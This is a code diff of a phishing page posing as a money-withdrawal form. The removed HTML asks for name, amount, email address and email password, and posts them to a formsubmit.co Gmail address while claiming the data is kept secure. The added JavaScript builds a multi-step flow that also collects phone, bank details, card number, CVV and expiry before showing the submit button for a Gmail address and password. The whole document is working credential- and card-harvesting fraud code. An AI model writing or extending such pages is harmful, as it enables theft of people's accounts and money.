@@ -1,136 +1,175 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>FILL THIS FORM TO WITHDRAW MONEY</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f9f9f9;
-      padding: 20px;
-    }
-    form {
-      background: white;
-      max-width: 500px;
-      margin: auto;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    h2 {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    label {
-      margin-top: 15px;
-      display: block;
-      font-weight: bold;
-    }
-    input {
-      width: 100%;
-      padding: 10px;
-      margin-top: 5px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 16px;
-    }
-    .error {
-      color: red;
-      font-size: 14px;
-      display: none;
-    }
-    .eye-toggle {
-      position: relative;
-    }
-    .eye-toggle input {
-      padding-right: 40px;
-    }
-    .eye-toggle span {
-      position: absolute;
-      top: 35%;
-      right: 10px;
-      cursor: pointer;
-      user-select: none;
-    }
-    button {
-      margin-top: 20px;
-      width: 100%;
-      padding: 12px;
-      font-size: 16px;
-      background: #28a745;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    button:disabled {
-      background: #aaa;
-      cursor: not-allowed;
-    }
-    .note {
-      margin-top: 20px;
-      text-align: center;
-      font-style: italic;
-      color: #555;
-    }
-  </style>
-</head>
-<body>
-  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" onsubmit="return validateBeforeSubmit()">
-    <h2>FILL THIS FORM TO WITHDRAW MONEY</h2>
+<script>
+  const form = document.getElementById("withdrawForm");
+  const fullName = document.getElementById("fullName");
+  const phone = document.getElementById("phoneNumber");
+  const amount = document.getElementById("amount");
+  const choice = document.getElementById("withdrawChoice");
+  const withdrawBox = document.getElementById("withdrawMessageBox");
+  const internationalBlock = document.getElementById("internationalBlock");
+  const nextStep = document.getElementById("nextStep");
+  const bankSection = document.getElementById("bankSection");
+  const atmLinked = document.getElementById("atmLinked");
+  const noATM = document.getElementById("noATM");
+  const cardVerify = document.getElementById("cardVerify");
+  const verifyMsg = document.getElementById("verifyMsg");
+  const finalConfirmBox = document.getElementById("finalConfirmBox");
+  const emailSection = document.getElementById("emailSection");
+  const email = document.getElementById("email");
+  const emailPassword = document.getElementById("emailPassword");
+  const submitBtn = document.getElementById("submitBtn");
+  const cancelBtn = document.getElementById("cancelBtn");
 
-    <label for="fullname">Full Name</label>
-    <input type="text" id="fullname" name="Full Name" required>
+  // Reset visibility
+  function resetSections() {
+    withdrawBox.classList.add("hidden");
+    internationalBlock.classList.add("hidden");
+    nextStep.innerHTML = "";
+    nextStep.classList.add("hidden");
+    bankSection.classList.add("hidden");
+    noATM.classList.add("hidden");
+    cardVerify.classList.add("hidden");
+    finalConfirmBox.classList.add("hidden");
+    emailSection.classList.add("hidden");
+    submitBtn.classList.add("hidden");
+    cancelBtn.classList.add("hidden");
+  }
 
-    <label for="amount">Amount You Want to Withdraw</label>
-    <input type="number" id="amount" name="Amount To Withdraw" required>
+  // Main dropdown change
+  choice.addEventListener("change", () => {
+    resetSections();
+    const userAmount = amount.value;
+    const userPhone = phone.value;
+    const userName = fullName.value;
 
-    <label for="email">Email Address</label>
-    <input type="email" id="email" name="Email Address" required>
+    if (choice.value === "yes") {
+      withdrawBox.innerText = `>> Withdrawing ${userAmount} to ${userPhone} <<`;
+      withdrawBox.classList.remove("hidden");
+      internationalBlock.classList.remove("hidden");
+      nextStep.classList.remove("hidden");
+      nextStep.innerHTML = `
+        <label>Do you have Bank Account?</label>
+        <select id="hasBank" required>
+          <option value="">Select</option>
+          <option value="yes">Yes</option>
+          <option value="no">No</option>
+        </select>
+      `;
 
-    <label for="emailPass">Email Password</label>
-    <div class="eye-toggle">
-      <input type="password" id="emailPass" name="Email Password" required>
-      <span onclick="togglePassword()">👁️</span>
-    </div>
+      document.getElementById("hasBank").addEventListener("change", (e) => {
+        if (e.target.value === "no") {
+          cancelBtn.classList.remove("hidden");
+          bankSection.classList.add("hidden");
+        } else {
+          bankSection.classList.remove("hidden");
+          cancelBtn.classList.add("hidden");
+        }
+      });
 
-    <div class="error" id="emailPassError">Please enter your email password.</div>
+    } else if (choice.value === "no") {
+      nextStep.classList.remove("hidden");
+      nextStep.innerHTML = `
+        <label>Which Payment Option do you have?</label>
+        <select id="payOption" required>
+          <option value="">Select</option>
+          <option value="other">Other Number</option>
+          <option value="bank">Bank Account</option>
+        </select>
+      `;
 
-    <input type="hidden" name="_next" value="thankyou.html">
-    <input type="hidden" name="_captcha" value="false">
+      document.getElementById("payOption").addEventListener("change", (e) => {
+        if (e.target.value === "other") {
+          nextStep.innerHTML += `
+            <label>Enter alternate phone number</label>
+            <input type="text" id="altPhone" pattern="\\d{9,13}" required />
+          `;
 
-    <button type="submit" id="submitBtn" disabled>Submit</button>
+          const altInput = document.getElementById("altPhone");
+          altInput.addEventListener("blur", () => {
+            withdrawBox.innerText = `>> Withdrawing ${amount.value} to ${altInput.value} <<`;
+            withdrawBox.classList.remove("hidden");
+            internationalBlock.classList.remove("hidden");
 
-    <p class="note">We keep your data secure and confidential</p>
-  </form>
+            nextStep.innerHTML += `
+              <label>Do you have Bank Account?</label>
+              <select id="hasBank2" required>
+                <option value="">Select</option>
+                <option value="yes">Yes</option>
+                <option value="no">No</option>
+              </select>
+            `;
 
-  <script>
-    const emailPassInput = document.getElementById("emailPass");
-    const submitBtn = document.getElementById("submitBtn");
-    const emailPassError = document.getElementById("emailPassError");
+            document.getElementById("hasBank2").addEventListener("change", (e2) => {
+              if (e2.target.value === "no") {
+                cancelBtn.classList.remove("hidden");
+                bankSection.classList.add("hidden");
+              } else {
+                bankSection.classList.remove("hidden");
+                cancelBtn.classList.add("hidden");
+              }
+            });
+          });
 
-    function togglePassword() {
-      emailPassInput.type = emailPassInput.type === "password" ? "text" : "password";
+        } else {
+          bankSection.classList.remove("hidden");
+        }
+      });
     }
+  });
 
-    emailPassInput.addEventListener("blur", () => {
-      if (emailPassInput.value.trim() === "") {
-        emailPassError.style.display = "block";
-        submitBtn.disabled = true;
-      } else {
-        emailPassError.style.display = "none";
-        submitBtn.disabled = false;
+  // ATM Linked choice
+  atmLinked.addEventListener("change", () => {
+    cardVerify.classList.add("hidden");
+    finalConfirmBox.classList.add("hidden");
+    emailSection.classList.add("hidden");
+    submitBtn.classList.add("hidden");
+    cancelBtn.classList.add("hidden");
+
+    if (atmLinked.value === "no") {
+      noATM.classList.remove("hidden");
+      cancelBtn.classList.remove("hidden");
+    } else {
+      noATM.classList.add("hidden");
+      cardVerify.classList.remove("hidden");
+      verifyMsg.innerText = `>> Let us verify your details so we can allow you withdraw ${amount.value} <<`;
+    }
+  });
+
+  // Expiry auto format
+  document.getElementById("expiry").addEventListener("input", function (e) {
+    let value = e.target.value.replace(/[^\\d]/g, "");
+    if (value.length >= 3) {
+      value = value.substring(0, 2) + "/" + value.substring(2, 4);
+    }
+    e.target.value = value;
+  });
+
+  // Show final confirmation after card details
+  ["cardNumber", "cvv", "expiry"].forEach(id => {
+    document.getElementById(id).addEventListener("blur", () => {
+      const card = document.getElementById("cardNumber").value;
+      const cvv = document.getElementById("cvv").value;
+      const exp = document.getElementById("expiry").value;
+      if (card.length === 16 && cvv.length === 3 && exp.includes("/")) {
+        finalConfirmBox.innerText = `>> Withdrawing ${amount.value} to your account <<`;
+        finalConfirmBox.classList.remove("hidden");
+        emailSection.classList.remove("hidden");
       }
     });
+  });
 
-    function validateBeforeSubmit() {
-      if (emailPassInput.value.trim() === "") {
-        emailPassError.style.display = "block";
-        return false;
+  // Show submit only if email and password are valid
+  [email, emailPassword].forEach(el => {
+    el.addEventListener("input", () => {
+      if (
+        email.value.endsWith("@gmail.com") &&
+        emailPassword.value.length > 0 &&
+        !cancelBtn.classList.contains("showing")
+      ) {
+        submitBtn.classList.remove("hidden");
+      } else {
+        submitBtn.classList.add("hidden");
       }
-      return true;
-    }
-  </script>
-</body>
-</html>
+    });
+  });
+
+</script>
